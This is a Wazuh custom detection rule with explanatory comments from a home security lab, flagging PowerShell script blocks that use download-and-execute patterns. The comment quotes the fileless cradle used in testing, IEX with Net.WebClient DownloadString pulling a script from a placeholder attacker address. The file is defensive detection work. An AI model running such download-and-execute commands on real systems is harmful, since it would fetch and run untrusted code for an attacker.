<!--
  Detection : Suspicious PowerShell Execution (fileless download pattern)
  Lab       : soc-home-lab (Wazuh 4.9.2, Win10 Target + Sysmon + PowerShell Script Block Logging)
  Install   : /var/ossec/etc/rules/local_rules.xml
              then: systemctl restart wazuh-manager
  Rule ID   : 100002 (custom range 100000+)

  Description:
    100002  Fires when a PowerShell Script Block Logging event (Event ID
            4104, matched via built-in rule 91837) contains one of several
            strings commonly seen in fileless download / execution
            patterns: DownloadString, EncodedCommand, FromBase64String,
            or Invoke-Expression. Level 12.

  MITRE ATT&CK:
    T1059.001  Command and Scripting Interpreter: PowerShell

  Why build on rule 91837:
    The built-in rule 91837 already flags "Get-Content -Stream or
    Invoke-Expresion" patterns at level 4 — useful but low-severity and
    generic. This custom rule re-checks the same scriptBlockText field for
    a tighter set of strings associated with fileless payload delivery and
    raises the severity to level 12, since these specific patterns are a
    stronger signal than the built-in rule's broader match alone.

  Validated against a real run:
    - Command executed on the target: a one-liner using
      IEX (New-Object Net.WebClient).DownloadString('http://<attacker-ip>/test.ps1')
      both directly and wrapped in powershell.exe -Command.
    - The remote .ps1 file did not exist / no HTTP server was listening on
      the attacker host, so the DownloadString call failed with a
      WebException ("Невозможно соединиться с удаленным сервером") and no
      remote payload was ever retrieved or executed.
    - PowerShell Script Block Logging (Event 4104) still logged the full
      command text before execution was attempted, so detection did not
      depend on the download succeeding.
    - Custom rule 100002 fired once per command variant (firedtimes: 1
      each) during the test, resulting in two separate alerts.

  Investigation: ../investigations/powershell-execution.md

  Future work:
    - Chain this with a follow-up rule for actual outbound HTTP/HTTPS
      connections from powershell.exe (correlating with Sysmon Event 3)
      to distinguish a logged-but-failed attempt from one that reached
      a live attacker server.
-->
<group name="windows,powershell,execution,custom,">

  <rule id="100002" level="12">
    <if_sid>91837</if_sid>
    <field name="win.eventdata.scriptBlockText">DownloadString|EncodedCommand|FromBase64String|Invoke-Expression</field>
    <description>Custom: Suspicious PowerShell Execution Detected (MITRE T1059.001)</description>
    <mitre>
      <id>T1059.001</id>
    </mitre>
    <group>execution</group>
  </rule>

</group>
